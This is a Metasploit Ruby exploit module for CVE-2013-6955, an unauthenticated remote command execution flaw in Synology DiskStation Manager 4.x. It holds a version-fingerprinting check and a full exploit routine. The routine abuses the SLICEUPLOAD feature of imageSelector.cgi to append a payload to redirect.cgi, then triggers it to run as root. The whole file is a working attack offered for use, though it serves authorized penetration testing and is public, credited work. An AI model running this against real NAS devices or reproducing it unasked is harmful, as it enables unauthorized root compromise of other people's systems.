## This module requires Metasploit: http//metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  DEVICE_INFO_PATTERN = /major=(?<major>\d+)&minor=(?<minor>\d+)&build=(?<build>\d+)
                        &junior=\d+&unique=synology_\w+_(?<model>[^&]+)/x

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Synology DiskStation Manager SLICEUPLOAD Remote Command Execution",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Synology DiskStation Manager (DSM)
        versions 4.x, which allows the execution of arbitrary commands under root
        privileges.
        The vulnerability is located in /webman/imageSelector.cgi, which allows to append
        arbitrary data to a given file using a so called SLICEUPLOAD functionality, which
        can be triggered by an unauthenticated user with a specially crafted HTTP request.
        This is exploited by this module to append the given commands to /redirect.cgi,
        which is a regular shell script file, and can be invoked with another HTTP request.
        Synology reported that the vulnerability has been fixed with versions 4.0-2259,
        4.2-3243, and 4.3-3810 Update 1, respectively; the 4.1 branch remains vulnerable.
      },
      &#039;Author&#039;         =>
        [
          &#039;Markus Wulftange&#039; # Discovery, Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-6955&#039; ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 0x31337,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl telnet&#039;,
            }
        },
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic&#039;, {}]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DisclosureDate&#039; => &#039;Oct 31 2013&#039;
    ))

    register_options(
      [
        Opt::RPORT(5000)
      ], self.class)
  end

  def check
    print_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(&#039;webman&#039;, &#039;info.cgi&#039;),
      &#039;vars_get&#039; => { &#039;host&#039; => &#039;&#039;}
    })

    if res and res.code == 200 and res.body =~ DEVICE_INFO_PATTERN
      version = "#{$~[:major]}.#{$~[:minor]}"
      build = $~[:build]
      model = $~[:model].sub(/^[a-z]+/) { |s| s[0].upcase }
      model = "DS#{model}" unless model =~ /^[A-Z]/
    else
      print_status("#{peer} - Detection failed")
      return Exploit::CheckCode::Unknown
    end

    print_status("#{peer} - Model #{model} with version #{version}-#{build} detected")

    case version
    when &#039;4.0&#039;
      return Exploit::CheckCode::Vulnerable if build < &#039;2259&#039;
    when &#039;4.1&#039;
      return Exploit::CheckCode::Vulnerable
    when &#039;4.2&#039;
      return Exploit::CheckCode::Vulnerable if build < &#039;3243&#039;
    when &#039;4.3&#039;
      return Exploit::CheckCode::Vulnerable if build < &#039;3810&#039;
      return Exploit::CheckCode::Detected if build == &#039;3810&#039;
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    cmds = [
      # sed is used to restore the redirect.cgi
      "sed -i -e &#039;/sed -i -e/,$d&#039; /usr/syno/synoman/redirect.cgi",
      payload.encoded
    ].join("\n")

    mime_msg = Rex::MIME::Message.new
    mime_msg.add_part(&#039;login&#039;, nil, nil, &#039;form-data; name="source"&#039;)
    mime_msg.add_part(&#039;logo&#039;, nil, nil, &#039;form-data; name="type"&#039;)

    # unfortunately, Rex::MIME::Message canonicalizes line breaks to \r\n,
    # so we use a placeholder and replace it later
    cmd_placeholder = Rex::Text::rand_text_alphanumeric(10)
    mime_msg.add_part(cmd_placeholder, &#039;application/octet-stream&#039;, nil,
                      &#039;form-data; name="foo"; filename="bar"&#039;)

    post_body = mime_msg.to_s
    post_body.strip!
    post_body.sub!(cmd_placeholder, cmds)

    # fix multipart encoding
    post_body.gsub!(/\r\n(--#{mime_msg.bound})/, &#039;  \\1&#039;)

    # send request to append shell commands
    print_status("#{peer} - Injecting the payload...")
    res = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri(&#039;webman&#039;, &#039;imageSelector.cgi&#039;),
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{mime_msg.bound}",
      &#039;headers&#039; => {
        &#039;X-TYPE-NAME&#039; => &#039;SLICEUPLOAD&#039;,
        &#039;X-TMP-FILE&#039;  => &#039;/usr/syno/synoman/redirect.cgi&#039;
      },
      &#039;data&#039;    => post_body
    })

    unless res and res.code == 200 and res.body.include?(&#039;error_noprivilege&#039;)
      fail_with(Failure::Unknown, "#{peer} - Unexpected response, probably the exploit failed")
    end

    # send request to invoke the injected shell commands
    print_status("#{peer} - Executing the payload...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(&#039;redirect.cgi&#039;),
    })

    # Read command output if cmd/unix/generic payload was used
    if datastore[&#039;CMD&#039;]
      unless res and res.code == 200
        fail_with(Failure::Unknown, "#{peer} - Unexpected response, probably the exploit failed")
      end

      print_good("#{peer} - Command successfully executed")
      print_line(res.body)
    end
  end
end

